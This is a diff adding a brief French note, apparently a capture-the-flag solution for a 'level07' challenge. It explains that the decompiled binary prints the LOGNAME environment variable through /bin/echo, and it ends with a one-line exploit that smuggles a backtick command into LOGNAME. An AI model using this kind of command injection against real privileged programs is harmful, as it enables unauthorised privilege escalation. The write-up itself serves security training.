@@ -1,0 +1,4 @@
+sur le binaire decompiler on peut voir qu'il y a un getenv de "LOGNAME"
+puis qu'il est imprimer avec /bin/echo
+
+export LOGNAME=\`getflag\`; ./level07 
